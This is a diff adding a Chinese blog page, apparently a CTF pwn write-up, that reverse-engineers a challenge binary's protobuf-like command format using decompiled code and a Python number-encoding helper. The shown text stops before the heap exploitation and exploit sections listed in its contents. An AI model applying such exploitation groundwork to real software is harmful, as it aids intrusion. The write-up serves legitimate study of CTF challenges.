@@ -1,0 +1,791 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":100,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
+  
+  <title>
+    babyshark |
+    
+    Hexo
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="前言昨天刚刚结束的湾区杯全场只有5解的pwn题,差点拿到3血(其实差了不少: &#x2F;  )失去了AI的辅助,全身心投入逆向分析,看起来也不是件坏事 附件分析附件可以到看雪上下载: 下载链接本题的数据传输采取了类似protobuf的序列化&#x2F;反序列化数据包传输指令所以我们在进行堆利用前要将自定义的vm操作梳理清楚 数据包逆向在主逻辑前,先是进行了对时间种子的设置经典的伪随机数 随后是个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="babyshark">
+<meta property="og:url" content="https://khighl.github.io.git/2025/09/16/%E6%B8%AF%E6%B9%BE%E6%9D%AF/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言昨天刚刚结束的湾区杯全场只有5解的pwn题,差点拿到3血(其实差了不少: &#x2F;  )失去了AI的辅助,全身心投入逆向分析,看起来也不是件坏事 附件分析附件可以到看雪上下载: 下载链接本题的数据传输采取了类似protobuf的序列化&#x2F;反序列化数据包传输指令所以我们在进行堆利用前要将自定义的vm操作梳理清楚 数据包逆向在主逻辑前,先是进行了对时间种子的设置经典的伪随机数 随后是个">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://khighl.github.io.git/images/%E6%B8%AF%E6%B9%BE%E6%9D%AF/1758028652777.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/%E6%B8%AF%E6%B9%BE%E6%9D%AF/1758028669696.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/%E6%B8%AF%E6%B9%BE%E6%9D%AF/1758028694275.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/%E6%B8%AF%E6%B9%BE%E6%9D%AF/1758028714914.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/%E6%B8%AF%E6%B9%BE%E6%9D%AF/1758028737988.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/%E6%B8%AF%E6%B9%BE%E6%9D%AF/1758028760614.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/%E6%B8%AF%E6%B9%BE%E6%9D%AF/1758028778124.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/%E6%B8%AF%E6%B9%BE%E6%9D%AF/1758028795461.png">
+<meta property="article:published_time" content="2025-09-15T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-09-16T13:26:15.745Z">
+<meta property="article:author" content="zer00ne">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://khighl.github.io.git/images/%E6%B8%AF%E6%B9%BE%E6%9D%AF/1758028652777.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="babyshark">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">babyshark</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%84%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">附件分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%8C%85%E9%80%86%E5%90%91"><span class="toc-number">2.1.</span> <span class="toc-text">数据包逆向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E6%95%B0%E5%AD%97%E7%9A%84%E8%BD%AC%E5%8C%96"><span class="toc-number">2.1.1.</span> <span class="toc-text">字符串与数字的转化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E6%88%90opcode%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">2.1.2.</span> <span class="toc-text">组成opcode的结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Idx%E7%9A%84%E8%8E%B7%E5%8F%96%E7%AE%97%E6%B3%95"><span class="toc-number">2.1.3.</span> <span class="toc-text">Idx的获取算法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%9D%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">堆块管理系统分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#create"><span class="toc-number">2.2.1.</span> <span class="toc-text">create</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit"><span class="toc-number">2.2.2.</span> <span class="toc-text">edit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delet-show"><span class="toc-number">2.2.3.</span> <span class="toc-text">delet&#x2F;show</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#uaf"><span class="toc-number">2.2.4.</span> <span class="toc-text">uaf</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">3.</span> <span class="toc-text">攻击思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">3.1.</span> <span class="toc-text">信息泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcachebins-poison%E6%94%BB%E5%87%BB"><span class="toc-number">3.2.</span> <span class="toc-text">tcachebins_poison攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0IO%E7%BB%93%E6%9E%84%E4%BD%93-%E5%B9%B6%E8%A7%A6%E5%8F%91%E5%85%B6%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0%E8%A1%A8"><span class="toc-number">3.3.</span> <span class="toc-text">伪造IO结构体,并触发其中的函数表</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4EXP"><span class="toc-number">4.</span> <span class="toc-text">完整EXP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">5.</span> <span class="toc-text">后记</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-港湾杯" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-09-15T16:00:00.000Z" itemprop="datePublished">2025-09-16</time>
+    <time style="display: none;" id="post-update-time">2025-09-16</time>
+  </span>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>昨天刚刚结束的湾区杯<br>全场只有5解的pwn题,差点拿到3血(其实差了不少: &#x2F;  )<br>失去了AI的辅助,全身心投入逆向分析,看起来也不是件坏事</p>
+<h1 id="附件分析"><a href="#附件分析" class="headerlink" title="附件分析"></a>附件分析</h1><p>附件可以到看雪上下载: <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-288492.htm">下载链接</a><br>本题的数据传输采取了类似<code>protobuf</code>的序列化&#x2F;反序列化数据包传输指令<br>所以我们在进行堆利用前要将自定义的<code>vm操作</code>梳理清楚</p>
+<h2 id="数据包逆向"><a href="#数据包逆向" class="headerlink" title="数据包逆向"></a>数据包逆向</h2><p>在主逻辑前,先是进行了对时间种子的设置<br>经典的伪随机数<br><img src="/images/%E6%B8%AF%E6%B9%BE%E6%9D%AF/1758028652777.png" alt="1758028652777"><br><img src="/images/%E6%B8%AF%E6%B9%BE%E6%9D%AF/1758028669696.png" alt="1758028669696"></p>
+<p>随后是个循环读入<br>注意看这里读入的循环判断,是当前读入的字节(char)为负数<br><img src="/images/%E6%B8%AF%E6%B9%BE%E6%9D%AF/1758028694275.png" alt="1758028694275"></p>
+<h3 id="字符串与数字的转化"><a href="#字符串与数字的转化" class="headerlink" title="字符串与数字的转化"></a>字符串与数字的转化</h3><p>读入后进行了dump_num操作,按照一定格式把str转化为__int64</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">dump_num</span><span class="params">(_QWORD *size, __int64 ptr, <span class="type">unsigned</span> __int64 n9_1, <span class="type">unsigned</span> __int64 *len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+27h] [rbp-19h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 n9; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  n9 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( n9 &lt; n9_1 &amp;&amp; n9 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = n9++;</span><br><span class="line">    v6 = *(_BYTE *)(ptr + v4);</span><br><span class="line">    v9 |= (<span class="type">unsigned</span> __int64)(v6 &amp; <span class="number">0x7F</span>) &lt;&lt; v8;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *size = v9;</span><br><span class="line">      *len = n9;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v8 += <span class="number">7</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFFL</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在循环中,将字符转化为数字,并使用”<code>|</code>“运算和”<code>&lt;&lt;</code>“运算将数字不断拼接<br>只有当前读入的字符对应的<code>ascii</code>为负数,才会继续读入<br>最终读取到对应正数的字符停止循环,将字符串对应的数字和有效字符串长度记录在<code>size</code>和<code>n9_1</code>变量中<br>下图代表了每个字节在此<code>vm</code>中的意义<br><img src="/images/%E6%B8%AF%E6%B9%BE%E6%9D%AF/1758028714914.png" alt="1758028714914"><br>而且负数只会取有效数部分而忽略正负标志位(<code>flag</code>)所以我们想要读入一个数字也要按照它设定的规则进行数字的传递,如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def m(n):</span><br><span class="line">    num=b&quot;&quot;</span><br><span class="line">    while n:</span><br><span class="line">        t=n&amp;0x7f</span><br><span class="line">        n=n&gt;&gt;7</span><br><span class="line">        t|=0x80</span><br><span class="line">        num+=p8(t)</span><br><span class="line">    s=u8(num[-1:])</span><br><span class="line">    num=num[:-1]</span><br><span class="line">    num+=p8(s-0x80)</span><br><span class="line">    return num</span><br></pre></td></tr></table></figure>
+
+<p>必须为保证想要读入的每一位对应的字符的正负标志位为1,我们可以为每位(除了最高位)都”<code>|</code>“上一个0x80(<code>char</code>类型的正负标志位),最高一字节保持正常(<code>ascii</code>对应为正数)<br><img src="/images/%E6%B8%AF%E6%B9%BE%E6%9D%AF/1758028737988.png" alt="1758028737988"><br>预期情况下会申请一个我们刚刚传入大小的堆块,并要求我们输入申请大小的数据</p>
+<h3 id="组成opcode的结构体"><a href="#组成opcode的结构体" class="headerlink" title="组成opcode的结构体"></a>组成<code>opcode</code>的结构体</h3><p>随后返回<code>main</code>函数调用<code>dump_opcode</code>函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">dump_opcode</span><span class="params">(__int64 ptr, <span class="type">unsigned</span> __int64 size, opchunk *opcode)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 n9; <span class="comment">// [rsp+28h] [rbp-48h] BYREF</span></span><br><span class="line">  __int64 num2; <span class="comment">// [rsp+30h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 n9_1; <span class="comment">// [rsp+38h] [rbp-38h] BYREF</span></span><br><span class="line">  __int64 num; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 len; <span class="comment">// [rsp+48h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 num1; <span class="comment">// [rsp+50h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 n3; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 n4; <span class="comment">// [rsp+60h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 now_len; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(opcode, <span class="number">0</span>, <span class="keyword">sizeof</span>(opchunk));</span><br><span class="line">  now_len = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( now_len &lt; size )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)dump_num(&amp;num1, ptr + now_len, size - now_len, &amp;len) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFL</span>L;</span><br><span class="line">    now_len += len;</span><br><span class="line">    n4 = num1 &gt;&gt; <span class="number">3</span>;                             <span class="comment">// 右移3位</span></span><br><span class="line">    n3 = num1 &amp; <span class="number">7</span>;                              <span class="comment">// 最3低位</span></span><br><span class="line">    <span class="keyword">if</span> ( (num1 &amp; <span class="number">7</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( n3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xFFFFFFFFL</span>L;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)dump_num(&amp;num2, ptr + now_len, size - now_len, &amp;n9) )<span class="comment">// 最低位为2</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xFFFFFFFFL</span>L;</span><br><span class="line">      now_len += n9;</span><br><span class="line">      <span class="keyword">if</span> ( size &lt; num2 + now_len )              <span class="comment">// num2大于剩余空间</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xFFFFFFFFL</span>L;</span><br><span class="line">      <span class="keyword">if</span> ( n4 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        opcode-&gt;content_ptr = now_len + ptr;    <span class="comment">// 剩余内容的起始指针</span></span><br><span class="line">        opcode-&gt;content_lenth = num2;           <span class="comment">// 第二个num(?)</span></span><br><span class="line">        opcode-&gt;content_flag = <span class="number">1</span>;               <span class="comment">// 标志位</span></span><br><span class="line">      &#125;</span><br><span class="line">      now_len += num2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                        <span class="comment">// 低三位为0</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)dump_num(&amp;num, ptr + now_len, size - now_len, &amp;n9_1) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xFFFFFFFFL</span>L;</span><br><span class="line">      now_len += n9_1;</span><br><span class="line">      <span class="keyword">switch</span> ( n4 )                             <span class="comment">// 右移三位</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">          opcode-&gt;opcode = num;</span><br><span class="line">          opcode-&gt;opcode_flag = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">          opcode-&gt;Idx = num;</span><br><span class="line">          opcode-&gt;Idx_flag = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3uLL</span>:</span><br><span class="line">          opcode-&gt;size = num;</span><br><span class="line">          opcode-&gt;size_flag = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先从上个函数读入的内容中开始使用dump_num取出一个数字<br>根据最低三比特与第四比特的bool标志进入不同的分支<br>分别opcode的不同字段设置内容&#x2F;设置不同内容对应的标志位<br>从这个函数中我们也能分析出对应的opcode结构体</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">fixed</span> <span class="title">opchunk</span> // <span class="title">sizeof</span>=</span><span class="number">0x38</span></span><br><span class="line">&#123;</span><br><span class="line">    __int64 opcode;</span><br><span class="line">    __int64 Idx;</span><br><span class="line">    __int64 size;</span><br><span class="line">    __int64 content_ptr;</span><br><span class="line">    __int64 content_lenth;</span><br><span class="line">    <span class="type">int</span> opcode_flag;</span><br><span class="line">    <span class="type">int</span> Idx_flag;</span><br><span class="line">    <span class="type">int</span> size_flag;</span><br><span class="line">    <span class="type">int</span> content_flag;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>其中</p>
+<ul>
+<li><p><code>opcode</code>用于指定进行什么堆操作(add,edit,free…)</p>
+</li>
+<li><p><code>Idx</code>用于设置操作堆块的编号</p>
+</li>
+<li><p><code>size</code>用于设置操作堆块的大小</p>
+</li>
+<li><p><code>content_ptr</code>用于设置想要<code>add/edit</code>的内容</p>
+</li>
+<li><p><code>content_len</code>用于指定<code>content</code>的长度</p>
+</li>
+<li><p>每个成员都对应一个<code>int</code>类型的<code>flag</code>位,用于标记此变量是否存在<br>根据每次从ptr中取出的num不同,可以一次性设置多个成员变量</p>
+<p><img src="/images/%E6%B8%AF%E6%B9%BE%E6%9D%AF/1758028760614.png" alt="1758028760614"></p>
+</li>
+</ul>
+<h3 id="Idx的获取算法"><a href="#Idx的获取算法" class="headerlink" title="Idx的获取算法"></a>Idx的获取算法</h3><p>随后根据数据包中idx的数值,使用get_idx转化真实的idx</p>
